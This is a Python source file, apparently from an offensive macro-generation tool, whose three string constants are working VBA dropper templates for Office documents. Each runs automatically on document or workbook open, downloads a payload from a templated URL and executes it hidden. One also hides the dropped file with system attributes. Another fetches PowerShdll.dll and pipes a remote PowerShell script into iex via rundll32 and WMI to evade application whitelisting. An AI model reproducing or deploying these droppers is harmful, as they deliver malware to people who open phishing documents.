#!/usr/bin/env python
# encoding: utf-8

DROPPER = \
"""

'Download and execute file
' will override any other file with same name
Private Sub DownloadAndExecute()
    Dim myURL As String
    Dim downloadPath As String
    Dim WinHttpReq As Object, oStream As Object
    Dim result As Integer
    
    myURL = "<<<TEMPLATE>>>"
    downloadPath = "<<<TEMPLATE>>>"
    
    Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP")
    WinHttpReq.setOption(2) = 13056 ' Ignore cert errors
    WinHttpReq.Open "GET", myURL, False ', "username", "password"
    WinHttpReq.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
    WinHttpReq.Send
    
    If WinHttpReq.Status = 200 Then
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1
        oStream.Write WinHttpReq.ResponseBody
        oStream.SaveToFile downloadPath, 2  ' 1 = no overwrite, 2 = overwrite (will not work with file attrs)
        oStream.Close
        result = Shell(downloadPath, 0) ' vbHide = 0
    End If    
    
End Sub


Sub AutoOpen()
    DownloadAndExecute
End Sub
Sub Workbook_Open()
    DownloadAndExecute
End Sub
"""

DROPPER2 = \
"""

'Download and execute file
' File is protected with readonly, hidden, and system attributes
' Will not download if payload has already been dropped once on system
' will override any other file with same name
Private Sub DownloadAndExecute()
    Dim myURL As String
    Dim downloadPath As String
    Dim WinHttpReq As Object, oStream As Object
    Dim result As Integer
    
    myURL = "<<<TEMPLATE>>>"
    downloadPath = "<<<TEMPLATE>>>"
    
    If Dir(downloadPath, vbHidden + vbSystem) = "" Then
        Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP")
        WinHttpReq.setOption(2) = 13056 ' Ignore cert errors
        WinHttpReq.Open "GET", myURL, False ', "username", "password"
        WinHttpReq.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
        WinHttpReq.Send
        
        If WinHttpReq.Status = 200 Then
            Set oStream = CreateObject("ADODB.Stream")
            oStream.Open
            oStream.Type = 1
            oStream.Write WinHttpReq.ResponseBody
            
            oStream.SaveToFile downloadPath, 2  ' 1 = no overwrite, 2 = overwrite (will not work with file attrs)
            oStream.Close
            SetAttr downloadPath, vbReadOnly + vbHidden + vbSystem
            result = Shell(downloadPath, 0) ' vbHide = 0
        End If
       
    End If
    
End Sub


Sub AutoOpen()
    DownloadAndExecute
End Sub
Sub Workbook_Open()
    DownloadAndExecute
End Sub
"""


DROPPER_PS = \
r"""
' Download and execute powershell script using rundll32.exe, without powershell.exe
' Thx to https://medium.com/@vivami/phishing-between-the-app-whitelists-1b7dcdab4279
' And https://github.com/p3nt4/PowerShdll

Sub AutoOpen()
    Debugging
End Sub

Sub Workbook_Open()
    Debugging
End Sub

Public Function Debugging() As Variant
    DownloadDLL
    Dim Str As String
    Str = "C:\Windows\System32\rundll32.exe " & Environ("TEMP") & "\powershdll.dll,main . { Invoke-WebRequest -useb <<<TEMPLATE>>> } ^| iex;"
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
    errReturn = objProcess.Create(Str, Null, objConfig, intProcessID)
End Function


Sub DownloadDLL()
    Dim dll_Loc As String
    dll_Loc = Environ("TEMP") & "\powershdll.dll"
    If Not Dir(dll_Loc, vbDirectory) = vbNullString Then
        Exit Sub
    End If
    
    Dim dll_URL As String
    #If Win64 Then
        dll_URL = "https://github.com/p3nt4/PowerShdll/raw/master/dll/bin/x64/Release/PowerShdll.dll"
    #Else
        dll_URL = "https://github.com/p3nt4/PowerShdll/raw/master/dll/bin/x86/Release/PowerShdll.dll"
    #End If
    
    Dim WinHttpReq As Object
    Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    WinHttpReq.Open "GET", dll_URL, False
    WinHttpReq.send

    myURL = WinHttpReq.responseBody
    If WinHttpReq.Status = 200 Then
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1
        oStream.Write WinHttpReq.responseBody
        oStream.SaveToFile dll_Loc
        oStream.Close
    End If
End Sub

"""